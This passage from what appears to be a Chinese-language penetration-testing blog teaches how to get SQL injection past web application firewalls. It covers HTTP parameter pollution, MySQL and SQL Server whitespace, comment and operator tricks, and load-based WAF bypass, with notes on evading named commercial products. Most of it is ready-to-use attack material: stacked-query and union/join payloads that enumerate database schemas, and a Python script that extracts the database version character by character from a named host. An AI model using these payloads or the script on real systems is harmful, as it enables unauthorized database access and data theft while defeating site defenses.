<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HPP是指HTTP参数污染。形如以下形式：</span><br><span class="line"></span><br><span class="line">?id=1&amp;id=2&amp;id=3的形式，此种形式在获取id值的时候不同的web技术获取的值是不一样的。</span><br><span class="line"></span><br><span class="line">假设提交的参数即为：</span><br><span class="line"></span><br><span class="line">id=1&amp;id=2&amp;id=3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Asp.net + iis：id=1,2,3</span><br><span class="line">Asp + iis：id=1,2,3</span><br><span class="line">Php + apache：id=3</span><br><span class="line">如此可以分析：当WAF获取参数的形式与WEB程序获取参数的形式不一致的时候，就可能出现WAF bypass的可能。</span><br><span class="line"></span><br><span class="line">Ps.此处关键还是要分析WAF对于获取参数的方式是如何处理的。这里也要再提一下的，hpp的灵活运用，譬如有些cms基于url的白名单，因此可以利用hpp的方式在参数一的位置添加白名单目录，参数2的位置添加恶意的payload。形如index.php?a=[whitelist]&amp;a=select 1 union select 2</span><br><span class="line"></span><br><span class="line">实例参考： WooYun: 使用webscan360的cms厂商通过hpp可使其失效（附cmseasy新版sql注射）</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">show_user.aspx?id<span class="operator">=</span><span class="number">5</span>;<span class="keyword">select</span><span class="operator">+</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">3</span><span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span><span class="keyword">where</span><span class="operator">+</span>id<span class="operator">=</span><span class="number">1</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>

<h4 id="数据库层bypass"><a href="#数据库层bypass" class="headerlink" title="数据库层bypass"></a>数据库层bypass</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">数据库层bypass常常是在bypass waf的sql注入防护规则。我们需要针对数据库使用该数据库的特性即可。如mysql，sqlserver等等。最近一直想整理下oracle的，这块也是研究不多的，后续整理后添加到文档里。</span><br><span class="line"></span><br><span class="line">Ps.目前数据库被暴露出来的特性很多很多，基本上很多特性综合利用就已经够用了，因此特性知不知道是一方面，能不能灵活运用就得看测试者自己了。</span><br></pre></td></tr></table></figure>

<h5 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就目前来看mysql是使用最多的，也是研究人员研究最深的数据库。在我自己测试的角度上我一般会去测试下面的过滤点，因为一般绕过了select from就基本可以sql注入获取数据了。</span><br></pre></td></tr></table></figure>

<h6 id="常见过滤的位置"><a href="#常见过滤的位置" class="headerlink" title="常见过滤的位置"></a>常见过滤的位置</h6><ul>
<li>第一：参数和union之间的位置</li>
</ul>
<p><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/16772">http://zone.wooyun.org/content/16772</a> 贴中有相关总结。</p>
<ol>
<li>\Nunion的形式：</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/union-test.jpg" alt="union-test"></p>
<ol start="2">
<li>浮点数的形式如1.1,8.0:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/float-test.jpg" alt="float-test"></p>
<ol start="3">
<li>8e0的形式:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/8e0-test.jpg" alt="8e0-test"></p>
<ol start="4">
<li>利用&#x2F;*!50000*&#x2F;的形式:</li>
</ol>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/50000-test.jpg" alt="50000-test"></p>
<ul>
<li>第二：union和select之前的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br><span class="line"></span><br><span class="line">例子:</span><br><span class="line">union/**s**/select/**s**/   #绕过360</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>使用括号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(*)from(tab_name);</span><br></pre></td></tr></table></figure>

<ul>
<li>第三：union select后的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他方式：(这里需要考虑的是有时候union select和select from可能是两个规则，这里先整理union select的)</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(1)括号：</span><br><span class="line">select(*)from(tab_name);</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(2)运算符号：</span><br><span class="line">减号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass1.jpg" alt="mysql-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">加号：</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass2.jpg" alt="mysql-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~号：</span><br></pre></td></tr></table></figure>
<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass3.jpg" alt="mysql-bypass3"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass4.jpg" alt="mysql-bypass4"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@`形式`:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass5.jpg" alt="mysql-bypass5"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*号，利用/*!50000*/的形式:</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass6.jpg" alt="mysql-bypass6"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">单引号和双引号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass7.jpg" alt="mysql-bypass7"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;括号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass8.jpg" alt="mysql-bypass8"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\N符号：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass9.jpg" alt="mysql-bypass9"></p>
<ul>
<li>第四：select from之间的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass10.jpg" alt="mysql-bypass10"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+,-,!,~,&#x27;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mysql-bypass11.jpg" alt="mysql-bypass11"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*号</span><br><span class="line"></span><br><span class="line">&#123;号</span><br><span class="line"></span><br><span class="line">(号</span><br></pre></td></tr></table></figure>

<ul>
<li>第五：select from之后的位置</li>
</ul>
<ol>
<li>空白字符</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql中可以利用的空白字符有：%09,%0a,%0b,%0c,%0d,%a0；</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用空白注释</span><br><span class="line">/*xxxx*/</span><br><span class="line">/*!xxxx*/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">``号</span><br><span class="line"></span><br><span class="line">*号</span><br><span class="line"></span><br><span class="line">&#123;号</span><br><span class="line"></span><br><span class="line">(括号</span><br><span class="line"></span><br><span class="line">Ps.空白符，注释符，/!50000select*/,&#123;x version&#125;,(),在很多点都可以使用，某些点有自己特殊的地方，可以使用一些其他的符号。</span><br><span class="line"></span><br><span class="line">实例：http://wooyun.org/bugs/wooyun-2010-0121291 实例就是利用灵活利用上面的特性，导致了bypass。</span><br></pre></td></tr></table></figure>

<h6 id="mysql常见过滤函数"><a href="#mysql常见过滤函数" class="headerlink" title="mysql常见过滤函数"></a>mysql常见过滤函数</h6><ul>
<li>字符串截取函数</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">以上全部被过滤时，使用concat：</span><br><span class="line">payload:</span><br><span class="line">hex(user()&lt;concat(char(67)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">附带脚本：</span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">url=<span class="string">&quot;http://sqlitest.anquanbao.com.cn/api/query?art_id=hex(version()&lt;CONCAT(%s))&quot;</span></span><br><span class="line">pre=<span class="string">&quot;&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">128</span>:</span><br><span class="line">    <span class="comment">#print url</span></span><br><span class="line">    r=requests.get(url%(pre+<span class="string">&#x27;char(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;)&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span> r.url</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.text)&gt;<span class="number">203</span>:</span><br><span class="line">        <span class="keyword">if</span> i!=<span class="number">33</span>:</span><br><span class="line">            pre=pre+<span class="string">&#x27;char(&#x27;</span>+<span class="built_in">str</span>(i-<span class="number">1</span>)+<span class="string">&#x27;),&#x27;</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(i-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span> result</span><br><span class="line">            i=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<ul>
<li>字符串连接函数</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">concat(version(),&#x27;|&#x27;,user());</span><br><span class="line">concat_ws(&#x27;|&#x27;,1,2,3)</span><br></pre></td></tr></table></figure>

<ul>
<li>字符转换</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Ascii(1)    #此函数之前测试某云waf的时候被过滤了，然后使用ascii(1)即可，函数名大小写绕过</span><br><span class="line">Char(49)    #范围0-255内可利用？</span><br><span class="line">Hex(&#x27;A&#x27;)</span><br><span class="line">Unhex(61)</span><br></pre></td></tr></table></figure>

<h6 id="过滤了逗号"><a href="#过滤了逗号" class="headerlink" title="过滤了逗号"></a>过滤了逗号</h6><ul>
<li>substr,mid等，使用from</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mid(user() from 1 for 1)</span><br><span class="line">或</span><br><span class="line">substr(user() from 1 for 1)</span><br><span class="line">最后结合ascii()取左边第一位，逐位猜解，此外还可以使用hex()？</span><br></pre></td></tr></table></figure>

<ul>
<li>limit，使用offset</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tab_name limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<ul>
<li>union处的逗号</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">通过<span class="keyword">join</span>拼接</span><br><span class="line"></span><br><span class="line">爆显示位</span><br><span class="line">payload：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span>&#123;x schema_name&#125; <span class="keyword">from</span> information_schema.schemata limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)c limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/sql-join.jpg" alt="sql-join"></p>
<h6 id="浮点精度特性"><a href="#浮点精度特性" class="headerlink" title="浮点精度特性"></a>浮点精度特性</h6><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php中:</span><br><span class="line">1.0000000000001 != 1</span><br><span class="line">1.0000000000000001</span><br><span class="line">在MySQL中:</span><br><span class="line">1.0000000000001 == 1</span><br><span class="line">1.0000000000000001 == 1</span><br></pre></td></tr></table></figure>

<h5 id="sqlserver数据库"><a href="#sqlserver数据库" class="headerlink" title="sqlserver数据库"></a>sqlserver数据库</h5><h6 id="常见过滤位置"><a href="#常见过滤位置" class="headerlink" title="常见过滤位置"></a>常见过滤位置</h6><ul>
<li>第一：select from后的位置</li>
</ul>
<ol>
<li>空白符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass1.jpg" alt="mssql-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">:符号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2.jpg" alt="mssql-bypass2"></p>
<ul>
<li>第二：select from之间的位置</li>
</ul>
<ol>
<li>空白符号：</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461187407-41.jpg" alt="mssql-bypass2"></p>
<ul>
<li>第三：and之后的位置</li>
</ul>
<ol>
<li>空白符号：</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20 </span><br><span class="line">需要做urlencode，sqlserver中的表示空白字符比较多，靠黑名单去阻断一般不合适。</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>注释符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mssql也可以使用注释符号/**/</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他符号:</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">:符号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass2-1768461194890-43.jpg" alt="mssql-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2b号</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass3.jpg" alt="mssql-bypass3"></p>
<h6 id="mssql常见过滤函数"><a href="#mssql常见过滤函数" class="headerlink" title="mssql常见过滤函数"></a>mssql常见过滤函数</h6><ol>
<li>字符串截取函数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>字符串转换函数</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ascii(&#x27;a&#x27;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#x27;97&#x27;)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>其他方式</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Mssql支持多语句查询，因此可以使用；结束上面的查询语句，然后执行自己构造的语句。动态执行。</span><br><span class="line"></span><br><span class="line">使用exec的方式：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass4.jpg" alt="mssql-bypass4"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用sp_executesql的方式：</span><br></pre></td></tr></table></figure>

<p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/mssql-bypass5.jpg" alt="mssql-bypass5"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用这类可以对自己的参数进行拼接，可以绕过WAF防御。</span><br><span class="line"></span><br><span class="line">如使用该类特性然后加上上面提到的:的特性就可以绕过安全狗的注入防御。</span><br></pre></td></tr></table></figure>

<h4 id="WAF层bypass"><a href="#WAF层bypass" class="headerlink" title="WAF层bypass"></a>WAF层bypass</h4><h5 id="性能bypass"><a href="#性能bypass" class="headerlink" title="性能bypass"></a>性能bypass</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WAF在设计的时候都会考虑到性能问题，例如如果是基于数据包的话会考虑检测数据包的包长，如果是基于数据流的话就会考虑检测一条数据流的多少个字节。一般这类算检测的性能，同时为了保证WAF的正常运行，往往还会做一个bypass设计，在性能如cpu高于80%或则内存使用率高于如80%是时候，会做检测bypass，以保证设备的正常运行。</span><br><span class="line"></span><br><span class="line">WAF等设备都是工作在应用层之上的，如HTTP,FTP,SMTP等都是应用层的协议，这些数据要被处理都会被进行数据解析，协议分析。最终获取应用层的数据。如HTTP的方法是什么，HTTP的querystring是什么，以及HTTP的requestbody是什么。然后将这些实时获取的值与WAF设计的规则进行匹配，匹配上着命中规则做相应的处理。</span><br></pre></td></tr></table></figure>

<h6 id="性能检测bypass"><a href="#性能检测bypass" class="headerlink" title="性能检测bypass"></a>性能检测bypass</h6><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass1.jpg" alt="per-bypass1"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">现在问题就是检测多长呢？例如我用HTTP POST上传一个2G的文件，明显不可能2G全做检测不但耗CPU，同时也会耗内存。因此在设计WAF的时候可能就会设计一个默认值，有可能是默认多少个字节的流大小，可能是多少个数据包。</span><br><span class="line"></span><br><span class="line">之前在zone发过个帖子，http://zone.wooyun.org/content/17331，是测试安全狗的，大致原理应该是一样的，设计了一个脚本，不断的向HTTP POST添加填充数据，当将填充数据添加到一定数目之后，发现POST中的sql注入恶意代码没有被检测了。最终达到了bypass的目的。</span><br><span class="line"></span><br><span class="line">在测试某家云WAF的时候使用此类方法也可以达到bypass的目的。</span><br></pre></td></tr></table></figure>

<h6 id="性能负载bypass"><a href="#性能负载bypass" class="headerlink" title="性能负载bypass"></a>性能负载bypass</h6><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/per-bypass2.jpg" alt="per-bypass2"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">一些传统硬件防护设备为了避免在高负载的时候影响用户体验，如延时等等问题，会考虑在高负载的时候bypass掉自己的防护功能，等到设备的负载低于门限值的时候又恢复正常工作。</span><br><span class="line"></span><br><span class="line">一些高性能的WAF可能使用这种方法可能不能bypass，但是一些软WAF使用这种方式还是可以bypass的。</span><br><span class="line"></span><br><span class="line">http://wooyun.org/bugs/wooyun-2010-094367 一个bypass的例子，将请求并发同时发送多次，多次访问的时候就有几次漏掉了，没有触发waf的拦截。</span><br><span class="line"></span><br><span class="line">Ps.作者自己在测试的时候曾经做了如下测试制造了一个payload，同时添加了大量的无效数据，使用脚本兵法发送该请求，发现请求的时候有些通过了WAF，有些被WAF所拦截了。应该就是性能问题导致了bypass。</span><br></pre></td></tr></table></figure>

<h4 id="fuzz-bypass"><a href="#fuzz-bypass" class="headerlink" title="fuzz bypass"></a>fuzz bypass</h4><p><img src="/../images/sql%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/fuzz-bypass1.jpg" alt="fuzz-bypass1"></p>
